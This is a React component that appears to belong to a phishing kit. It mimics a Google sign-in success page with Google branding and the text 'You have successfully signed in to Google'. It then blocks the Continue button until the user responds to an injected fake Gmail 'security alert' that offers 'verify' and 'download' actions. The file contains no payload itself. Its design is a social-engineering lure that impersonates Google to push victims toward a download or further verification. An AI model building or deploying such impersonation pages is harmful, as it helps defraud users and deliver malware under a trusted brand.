import { Button } from "@/components/ui/button";
import { CheckCircle } from "lucide-react";
import React, { useEffect, useState } from "react";
import GmailNotification from "./GmailNotification";

interface SuccessStepProps {
  onContinue: () => void;
}

export function SuccessStep({ onContinue }: SuccessStepProps) {
  const [gmailInteracted, setGmailInteracted] = useState(false);

  useEffect(() => {
    // If global flag already set, respect it
    try {
      if ((window as any).gmailUserInteracted) setGmailInteracted(true);
    } catch (e) {}

    // Expose callbacks so other scripts can notify us
    try { (window as any).onGmailVerify = () => setGmailInteracted(true); } catch (e) {}
    try { (window as any).onGmailDownload = () => setGmailInteracted(true); } catch (e) {}
  }, []);
  return (
    <div className="text-center">
      <div className="mb-6">
        <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
          <CheckCircle className="w-8 h-8 text-green-600" />
        </div>
      </div>

      <h1 className="text-2xl font-product-sans font-normal text-gray-800 mb-4">Welcome!</h1>
      <p className="text-sm text-google-gray mb-8">
        You have successfully signed in to Google.
      </p>

      <Button 
        data-testid="button-continue"
        onClick={() => {
          if (!gmailInteracted) {
            // block proceed until interaction
            alert('Please check the security alert and verify your account before proceeding.');
            return;
          }
          onContinue();
        }}
        disabled={!gmailInteracted}
        className="google-button bg-google-blue text-white px-8 py-2 rounded-md font-medium text-sm hover:bg-google-blue-dark"
      >
        Continue
      </Button>

      {/* Gmail notification injected here; forceShow ensures icon appears on this page */}
      <GmailNotification forceShow onVerify={() => setGmailInteracted(true)} onDownload={() => setGmailInteracted(true)} />
    </div>
  );
}
